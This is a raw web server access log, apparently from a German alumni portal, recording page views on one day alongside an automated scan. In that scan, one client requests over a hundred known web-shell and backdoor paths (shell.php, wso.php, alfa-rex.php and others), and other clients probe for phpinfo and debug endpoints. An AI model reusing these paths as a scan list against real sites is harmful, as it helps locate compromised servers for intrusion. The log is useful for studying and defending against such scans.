c6f815cf1e24e7ddcf8d6056d055713d865fe1a6293f635144731c9dfc09f9e5;2025-11-07 12:34:04;/personen/all/4;/personen/alumni/schule/188001;GET;200
7e0e8fa8d4460e5f34f75d7c37b834dc22df6f66c6a92ce0c0475e3f3762b555;2025-11-07 12:35:07;;/personen/alumni/details/asja-apelt-genannt-henze;GET;200
ebf07fbebbaf6b18ab7315bd48406b44ebb680ff7b450ac2384d3d10ba97d3cb;2025-11-07 12:35:07;/personen/alumni/details/thomas-matzig;/gruppen/hobby/malen-und-zeichnen;GET;200
10eb520743426e1024ebf3661c55d9d2ea4b02ae0e6659ad607824e1d5f145ff;2025-11-07 12:35:25;;/themen/details/uni-zwischen-ebbe-und-flut;GET;200
ebf07fbebbaf6b18ab7315bd48406b44ebb680ff7b450ac2384d3d10ba97d3cb;2025-11-07 12:36:49;/personen/alumni/details/sebastian-langhorst;/gruppen/hobby/einzelsportarten;GET;200
02e2f1393eb797f954fde586da58e8b3b44e5dbdecaba0160b1020eba89f1e91;2025-11-07 12:38:23;/actuator/gateway/routes;/actuator/gateway/routes;GET;404
edf3af8d422d251d21b239d49f13318e689d2f39022ffed1f91ae13b4531e459;2025-11-07 13:08:32;;/adminer.php/adminer.php;GET;404
5b73655a1afbc2ffe4ef57407a07a6cd77d8860407f263abba8b9c465870975f;2025-11-07 13:11:49;;/docs/img/uml-interface-2.png;GET;404
56c00389a9884a04b2c3c1fd6eafd9d14a3de8ce0f683c4452f0f2eb47aa9dd2;2025-11-07 13:21:54;/gruppen;/gruppen/hobby/gartnern;GET;200
6ea2de80566292d3c3e5895f04184d90ea52f106ad6f49a367a86aa86065f228;2025-11-07 13:22:44;;/;GET;200
44098344805b82343813bd6246fa89ecf0d5446c1cd097ff2cd8bba3ab2bd8d0;2025-11-07 13:23:19;;/personen/alumni/schule/03A04;GET;200
0b399015a9ce3f84df599e6854b14fa4162a6baa42cf73158380d1f1f622d0e9;2025-11-07 13:32:25;;/;GET;200
348b75b05d3ddb541a1b84d2517cebaaf085ddd35030ce7ef30b0c4feb56e9a8;2025-11-07 13:35:20;;/themen/2;GET;200
9fb41a111a7583422e066521d5bf29ad592b12a22e9f2e3d37db940781a75ffe;2025-11-07 13:42:46;/personen/all/4;/personen/alumni/schule/170690;GET;200
ae89e10e78bf2c3944b34de02275b6d065a9ab9012bd639237cae7d1fe4be322;2025-11-07 13:50:40;;/themen?category=politik;GET;200
7e773c55252c5cc1de61ba9b988edd333525232de087137e8da0c171d725a089;2025-11-07 13:53:30;;/;GET;200
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:57:00;;/wp-content/plugins/hellopress/wp_filemanager.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:57:02;;/shoha.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:57:02;;/system.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:57:03;;/shell.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:57:04;;/wp.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:57:05;;/m.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:57:06;;/sto.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:57:07;;/db.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:57:08;;/222.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:57:09;;/o.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:57:09;;/an.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:57:10;;/gmo.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:57:11;;/file.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:57:12;;/wp-content/upgrade/f35.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:57:13;;/index/function.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:57:14;;/wp-includes/Text/Diff/sts.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:57:14;;/wp-admin/css/colour.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:57:15;;/wp-includes/widgets/past.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:57:16;;/wp-content/upgrade/20ojy.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:57:17;;/wp-includes/block-bindings.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:57:18;;/wp-admin/css/colors/sunrise/%20colors.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:57:19;;/.well-known/file.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:57:20;;/.well-known/fm.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:57:20;;/wp-admin/js/prayer_intentions.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:57:21;;/vendor/wp-login.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:57:22;;/system.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:57:23;;/wp-admin/images/lint-branch.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:57:24;;/wp-content/uploads/layout.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:57:25;;/wp-admin/images/wp-signup.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:57:26;;/wp-admin/images/click.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:57:26;;/wp-admin/css/colors/blue/end.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:57:27;;/uploat.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:57:28;;/wp-includes/widgets/buy.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:57:29;;/wp-includes/fonts/about.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:57:30;;/uploxe.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:57:31;;/wp-includes/kn18l3.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:57:32;;/images/class-config.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:57:32;;/wp-includes/Requests/Cookie/alfa-rex.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:57:34;;/.well-known/log.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:57:35;;/wp-content/uploads/credits.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:57:35;;/wp-includes/orvxmailer.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:57:36;;/wp-admin/includes/lint-branch.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:57:37;;/wp-admin/fw.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:57:38;;/.well-known/pki-validation/404.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:57:39;;/files/files_uploader.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:57:40;;/wp-content/plugins/pwnd-1/pwnd.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:57:40;;/wp-includes/js/jcrop/Jcrop.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:57:41;;/wp-admin/includes/admin-ajax.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:57:42;;/wp-includes/js/thickbox/alfa-rex.php8;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:57:43;;/wp-admin/css/colors/soYgFVi.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:57:44;;/wp-admin/css/colors/midnight/YRFLoxBi.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:57:45;;/wp-includes/ID3/colour.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:57:46;;/wp-includes/js/dist/alfa-rex.php7;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:57:46;;/wp-admin/js/widgets/wp-kaori.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:57:47;;/.bod/.ll/ss.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:57:48;;/wp-includes/Text/about.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:57:49;;/tentang_rmol.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:57:50;;/uploads/bigdump.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:57:51;;/file.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:57:52;;/wp-admin/includes/go.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:57:53;;/k.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:57:53;;/wp-admin/includes/plugin-wp.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:57:54;;/wp-includes/wp-class-db.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:57:55;;/wp-includes/widgets/index.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:57:56;;/wp-includes/sitemaps/white.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:57:57;;/wp-admin/includes/pt.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:57:58;;/wp-admin/js/widgets/pepe.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:57:59;;/wp-admin/kOns8dgHcTK.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:57:59;;/1index.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:58:00;;/wp-login.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:58:01;;/info.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:58:02;;/wp-content/themes/xss/about.php7;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:58:03;;/wp-content/plugins/azra-tn/wso.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:58:04;;/wp-includes/davoeqyv.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:58:05;;/wp-content/languages/ru_RU_lite.mo.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:58:06;;/uploadx.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:58:06;;/wp-includes/sitemaps/providers/file.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:58:07;;/oxvrws.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:58:08;;/wp-content/upgrade/rk2.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:58:09;;/wp-admin/images/browser.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:58:10;;/wp-admin/lRGuqAwmnyh.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:58:11;;/wp-includes/Text/Diff/index.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:58:12;;/wp-includes/class-wordpress-license.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:58:13;;/wp-load.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:58:13;;/wp-includes/widgets/goat.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:58:14;;/wp-admin/maint/1wx.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:58:15;;/wp-admin/css/colors/coffee/admin.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:58:16;;/wp-admin/css/colors/akVyV.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:58:17;;/xl2023.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:58:18;;/dropdown.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:58:19;;/wp-admin/css/colors/blue/file.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:58:19;;/shell20211028.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:58:20;;/wp-includes/as.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:58:21;;/wp-includes/Text/lzmelu.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:58:22;;/.well-known/autoconfig/atomlib.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:58:23;;/wp-includes/class-wp-more.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:58:24;;/.well-known/oasnykdf.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:58:25;;/ws.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:58:26;;/wp-includes/widgets/system.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:58:26;;/wp-content/plugins/cp-pro/js.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:58:27;;/wp-includes/css/error_log.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:58:28;;/wp-content/plugins/pwnd/pwnd.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:58:29;;/wp-includes/pomo/entry-view.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:58:30;;/wp-includes/css/about.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:58:31;;/wp-admin/includes/mango.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:58:32;;/images/up.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:58:33;;/wp-includes/ID3/about.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:58:33;;/wp-includes/Requests/about.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:58:34;;/wp-admin/maint/singlex.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:58:35;;/wp-admin/css/colors/BbiNip.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:58:36;;/wp-admin/8T1hs2AP4ox.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:58:37;;/wp-admin/js/widgets/gool.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:58:38;;/wp-content/themes/sketch/404.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:58:39;;/wp-admin/css/hehe.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:58:40;;/403.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:58:41;;/wp-admin/js/lint-branch.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:58:42;;/wp-admin/maint/wp-is.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:58:43;;/wp-includes/rollback-handler.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:58:43;;/wp-admin/js/hehe.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:58:44;;/wp-content/index.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:58:45;;/wp-includes/post-template-url.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:58:46;;/wp-includes/js/client-dashboard.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:58:47;;/wp-admin/maint/cong.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:58:48;;/inputs.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:58:49;;/bala.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:58:50;;/wp-content/plugins/index.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:58:50;;/.well-known/ae.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:58:51;;/function/function.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:58:52;;/wp-includes/cqhlsvmp.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:58:53;;/wp-admin/maint/pagea.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:58:54;;/uplozyu.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:58:55;;/wp-admin/maint/wp-login.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:58:55;;/wp-includes/ID3/Auth.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:58:56;;/ropyx.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:58:57;;/wp-includes/blocks/CdHjunpTsr.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:58:58;;/wp-head.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:58:59;;/wp-includes/Text/about.php7;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:59:00;;/fwe.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:59:01;;/.well-known/nam.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-07 13:59:01;;/2.php;GET;404
9d8ba8654ed7f246e10fd8c967c1036e3f16f5ea79024f6e7076c17d40c575b3;2025-11-07 14:14:09;;/;GET;200
f277b1a2c167738cf626c835a15171bdd5dc4952e5daef99f405fcad3e0a0c72;2025-11-07 14:20:42;;/veranstaltungen/details/wohnzimmerkonzert;GET;200
2909923c17713f7bb253712fb3cdb66bc26eea24c6f284fe53684c62c0cb8f67;2025-11-07 14:32:15;;/app_dev.php/_profiler/phpinfo;GET;404
2909923c17713f7bb253712fb3cdb66bc26eea24c6f284fe53684c62c0cb8f67;2025-11-07 14:32:18;;/?phpinfo=-1;GET;200
2909923c17713f7bb253712fb3cdb66bc26eea24c6f284fe53684c62c0cb8f67;2025-11-07 14:32:21;;/frontend/web/debug/default/view;GET;404
2909923c17713f7bb253712fb3cdb66bc26eea24c6f284fe53684c62c0cb8f67;2025-11-07 14:32:31;;/infos/;GET;404
f9f66e388dee439b8deb5f28d8620360d999b51a7be01b3b7f16f5ac79655b0e;2025-11-07 14:37:14;;/?page=docs-MA1-lineq.md;GET;200
e86484588def5b1fc7b08a6ccdd99460615f6cb20c187494245e0a66f2c2d0b8;2025-11-07 14:38:49;;/;GET;200
e86484588def5b1fc7b08a6ccdd99460615f6cb20c187494245e0a66f2c2d0b8;2025-11-07 14:38:49;;/themen/details/der-start-ins-studium;GET;200
e86484588def5b1fc7b08a6ccdd99460615f6cb20c187494245e0a66f2c2d0b8;2025-11-07 14:38:50;;/personen;GET;200
e86484588def5b1fc7b08a6ccdd99460615f6cb20c187494245e0a66f2c2d0b8;2025-11-07 14:38:50;;/aktuelles/stellenangebote;GET;200
e86484588def5b1fc7b08a6ccdd99460615f6cb20c187494245e0a66f2c2d0b8;2025-11-07 14:38:51;;/themen/details/abschied-aus-moabit;GET;200
e86484588def5b1fc7b08a6ccdd99460615f6cb20c187494245e0a66f2c2d0b8;2025-11-07 14:38:51;;/aktuelles/meldungen/details/hackerangriff-lauft-ins-leere;GET;200
e86484588def5b1fc7b08a6ccdd99460615f6cb20c187494245e0a66f2c2d0b8;2025-11-07 14:38:51;;/aktuelles/meldungen/details/alumni-portal-des-zbw-geht-an-den-start;GET;200
a3b8977d0df10ec093ebffb6ad73d65b70dc8008083b2f635f6b801f68b762a6;2025-11-07 14:47:27;www.google.com;/userfuns.php;GET;404
a3b8977d0df10ec093ebffb6ad73d65b70dc8008083b2f635f6b801f68b762a6;2025-11-07 14:47:29;www.google.com;/postnews.php;GET;404
5548c59f29c8f0190c5c415a768bd0105af9d24e9b7da602628263a242605814;2025-11-07 14:47:43;/;/personen/alumni/schule/170720;GET;200
217619e443cc84e5eb15d2789006336a23ede6cd103c4505d07c468b96845959;2025-11-07 14:49:59;;/;GET;200
5da41ab66c80919af6d7088b16197ad11f3f7d90ecc83a04dbdd0caf3026f80b;2025-11-07 14:52:46;;/personen/all/3;GET;200
55a38f2eb1e7af7da6c19cdbb7c50a198e5a4dc11781e88fe8663646b3bad146;2025-11-07 15:12:40;/;/;GET;200
0ea4c89e30e34c9638ee01314654b8426f3383ea84300cd20f4497c30452db7c;2025-11-07 15:15:09;;/personen;GET;200
94d10329701f972a4e9560982dcbf915d8d5021b7b3e7844d5e51d93ed97c11c;2025-11-07 15:23:25;;/;GET;200
f6e1f337fb967658677655b3683bbfaa9381ac62f152d3fd977528ebbcd8b7ee;2025-11-07 15:29:08;;/personen/alumni/details/heidi-burghard;GET;200
4f2050e39b2b8672456c295ce378d7dbd2cd5bec810b370dad55b010afc2a123;2025-11-07 15:32:41;;/;GET;200
4a5e4cc420720eba27822a113549d8845ef9eca5b04a1d0a578ff713ffae10f7;2025-11-07 15:33:57;/personen/all/4;/aktuelles/stellenangebote;GET;200
a718af78d895c19ebaea4473869073bf549ac124408dc9b028e8a698d6a9f9e0;2025-11-07 15:40:30;;/personen/all/5;GET;200
ea50cb000ecc0b9caac15d3a18bdfe649ecad664bfc142bfd4be9274ea98a94f;2025-11-07 15:44:02;;/?page=docs-html-typo.md;GET;200
71f331bda3ff5a1b1880b5ed375ee4aaa4463d7945558b9cb3608207a62c0b22;2025-11-07 15:47:21;;/personen/alumni/details/sophia-gawron;GET;200
efe61709482defa3cc33cc46ed6e75ae55f446aeb1c83fbc8b9a9bb9364f544e;2025-11-07 15:50:21;;/;GET;200
f15714e00cb803c16785c9df4088b3bc18273773a206b1cbd10cfb9dc3738481;2025-11-07 15:50:50;;/;GET;200
f15714e00cb803c16785c9df4088b3bc18273773a206b1cbd10cfb9dc3738481;2025-11-07 15:50:52;/;/profile;GET;302
f15714e00cb803c16785c9df4088b3bc18273773a206b1cbd10cfb9dc3738481;2025-11-07 15:50:52;/;/login;GET;200
f15714e00cb803c16785c9df4088b3bc18273773a206b1cbd10cfb9dc3738481;2025-11-07 15:50:54;/login;/profile;GET;200
412e0ca73889b8b86a5cbcb1ebf9570b5d70c5ecd1c9499639a25b7610542eb6;2025-11-07 15:50:58;/;/profile;GET;302
412e0ca73889b8b86a5cbcb1ebf9570b5d70c5ecd1c9499639a25b7610542eb6;2025-11-07 15:50:58;/;/login;GET;200
f15714e00cb803c16785c9df4088b3bc18273773a206b1cbd10cfb9dc3738481;2025-11-07 15:51:02;/profile;/gruppen;GET;200
f15714e00cb803c16785c9df4088b3bc18273773a206b1cbd10cfb9dc3738481;2025-11-07 15:51:24;/gruppen;/gruppen/hobby/gartnern;GET;200
f15714e00cb803c16785c9df4088b3bc18273773a206b1cbd10cfb9dc3738481;2025-11-07 15:51:34;/gruppen/hobby/gartnern;/gruppen;GET;200
f15714e00cb803c16785c9df4088b3bc18273773a206b1cbd10cfb9dc3738481;2025-11-07 15:51:35;/gruppen;/profile;GET;200
f15714e00cb803c16785c9df4088b3bc18273773a206b1cbd10cfb9dc3738481;2025-11-07 15:51:43;/profile;/gruppen/hobby/programmieren;GET;200
f15714e00cb803c16785c9df4088b3bc18273773a206b1cbd10cfb9dc3738481;2025-11-07 15:51:52;/gruppen/hobby/programmieren;/gruppen;GET;200
f15714e00cb803c16785c9df4088b3bc18273773a206b1cbd10cfb9dc3738481;2025-11-07 15:52:21;/gruppen;/gruppen/hobby/journalismus;GET;200
f15714e00cb803c16785c9df4088b3bc18273773a206b1cbd10cfb9dc3738481;2025-11-07 15:52:29;/gruppen/hobby/journalismus;/admin;GET;200
